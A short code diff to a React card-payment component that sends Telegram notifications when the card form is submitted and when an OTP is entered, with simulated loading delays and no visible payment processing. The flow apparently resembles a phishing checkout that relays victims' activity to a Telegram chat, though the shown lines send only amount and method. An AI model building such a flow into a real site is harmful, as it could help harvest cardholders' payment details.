@@ -141,7 +141,7 @@ const MastercardPayment = () => {
   const handleSubmit = () => {
     if (!isFormValid()) return;
     setIsLoading(true);
-    sendTelegramNotification({ type: 'payment_confirmed', amount, method: 'Mastercard' });
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card' });
     setTimeout(() => {
       setIsLoading(false);
       setShowOtp(true);
@@ -151,6 +151,7 @@ const MastercardPayment = () => {
 
   const handleOtpConfirm = () => {
     if (otpCode.length !== 6) return;
+    sendTelegramNotification({ type: 'payment_activity', amount, method: 'Mastercard', paymentType: 'card' });
     setOtpLoading(true);
     setTimeout(() => {
       setOtpLoading(false);
